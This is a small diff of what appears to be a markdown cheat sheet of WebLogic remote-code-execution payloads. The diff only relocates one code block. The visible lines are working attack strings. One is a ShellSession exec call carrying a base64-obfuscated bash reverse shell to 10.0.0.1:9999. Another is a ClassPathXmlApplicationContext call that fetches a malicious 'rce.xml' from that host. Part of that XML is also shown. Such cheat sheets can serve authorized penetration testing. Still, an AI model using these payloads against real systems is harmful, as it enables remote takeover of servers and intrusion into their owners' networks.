@@ -94,6 +94,10 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|
 com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(new%20String%20[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"});')
 ```
 ###
+```
+com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://10.0.0.1/rce.xml")
+```
+###
 rce.xml
 ```
 <?xml version="1.0" encoding="UTF-8" ?>
@@ -110,10 +114,6 @@ rce.xml
         </constructor-arg>
     </bean>
 </beans>
-```
-###
-```
-com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://10.0.0.1/rce.xml")
 ```
 ###
 #### Base64 Encoded Payload for Deserialization
